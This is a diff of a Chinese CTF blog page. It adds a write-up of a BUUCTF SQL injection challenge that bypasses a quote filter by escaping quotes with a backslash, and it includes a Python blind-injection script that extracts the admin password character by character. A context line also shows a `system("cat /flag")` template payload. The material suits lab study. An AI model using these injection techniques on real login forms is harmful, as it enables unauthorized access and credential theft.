@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      728 字
+      1.1k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      15
        分钟
     </span>
   
@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：20 天前
+                  本文最后更新于：4 分钟前
                 
               </p>
             
@@ -324,6 +324,53 @@ $_SESSION[<span class="hljs-string">'id'</span>] = $id;
 <div class="hljs"><pre><code class="hljs clojure">&#123;system(<span class="hljs-string">"cat /flag"</span>)&#125;</code></pre></div>
 
 
+
+
+
+<h2 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h2><p>题目明确说是注入，首先fuzz一下看看是否过滤了什么字符，结果发现过了<code>&#39;,&quot;,=,and,select</code>等字符</p>
+<p>扫描目录发现还给了提示</p>
+<p><img src="https://i.loli.net/2020/12/22/W6uxXzSaLjZdI8k.png" srcset="/img/loading.gif" alt="image-20201222221710801"></p>
+<p>本来想着过滤了单引号这个题目应该很难做，但是看到给了sql语句后便有了思路</p>
+<p>可以将username位置的单引号转义，使得username的前半个单引号与password的前半个单引号闭合，再将后面的内容注释</p>
+<div class="hljs"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">'username\'</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">'or 2&gt;1#'</span>;</code></pre></div>
+
+<p>这样构造出的sql语句，username字段的值变成 <code>username\&#39; and password=</code>，之后就可以拼接想要构造的查询语句</p>
+<p>首先测试</p>
+<p><img src="https://i.loli.net/2020/12/22/7udeGf3cFmNoXTJ.png" srcset="/img/loading.gif" alt="image-20201222222541513"></p>
+<p>发现回显页面出现了新的提示，典型的盲注</p>
+<p>根据提示给出的内容，我们需要知道登录密码所以构造出payload</p>
+<div class="hljs"><pre><code class="hljs pgsql">username=<span class="hljs-keyword">admin</span>\&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">or</span> ascii(substr(<span class="hljs-keyword">password</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">79</span> #</code></pre></div>
+
+<p>完整脚本如下（因为buu平台的题目访问间隔过短的话会出现429，所以设置了间隔一秒访问）</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+s = requests.Session()
+url = <span class="hljs-string">"http://16b494d1-c6b0-4d81-a1ec-9b020959aa2e.node3.buuoj.cn/"</span>
+
+password = <span class="hljs-string">''</span>
+data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'admin\\'</span>, <span class="hljs-string">'password'</span>:password&#125;
+res = <span class="hljs-string">''</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
+    left = <span class="hljs-number">32</span>
+    right = <span class="hljs-number">128</span>
+    mid = (right+right)&gt;&gt;<span class="hljs-number">1</span>
+    <span class="hljs-keyword">while</span> left &lt; right:
+        time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment"># 这设置了每隔一秒访问一次，防止出现429</span>
+        password = <span class="hljs-string">'or ascii(substr(password,&#123;0&#125;,1))&gt;&#123;1&#125; #'</span>.format(i,mid)
+        data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'admin\\'</span>, <span class="hljs-string">'password'</span>: password&#125;
+        respose = s.post(url,data)
+        print(respose.status_code,mid,i)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">'BJD needs to be stronger'</span> <span class="hljs-keyword">in</span> respose.text:
+            left = mid+<span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            right = mid
+        mid = (right + left)&gt;&gt;<span class="hljs-number">1</span>
+    res += chr(mid)
+    print(res)
+    
+<span class="hljs-comment"># OhyOuFOuNdit</span></code></pre></div>
+
+
             </div>
             <hr>
             <div>
@@ -340,9 +387,9 @@ $_SESSION[<span class="hljs-string">'id'</span>] = $id;
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/md5/">md5</a>
-                    
                       <a class="hover-with-bg" href="/tags/sql/">sql</a>
+                    
+                      <a class="hover-with-bg" href="/tags/md5/">md5</a>
                     
                       <a class="hover-with-bg" href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">php伪协议</a>
                     
@@ -352,29 +399,6 @@ $_SESSION[<span class="hljs-string">'id'</span>] = $id;
               
                 <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
               
-              
-                <div class="post-prevnext row">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2020/10/05/buuoj/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">buuctf-sql注入</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2020/09/27/homework/">
-                        <span class="hidden-mobile">网安作业1</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
               
             </div>
 
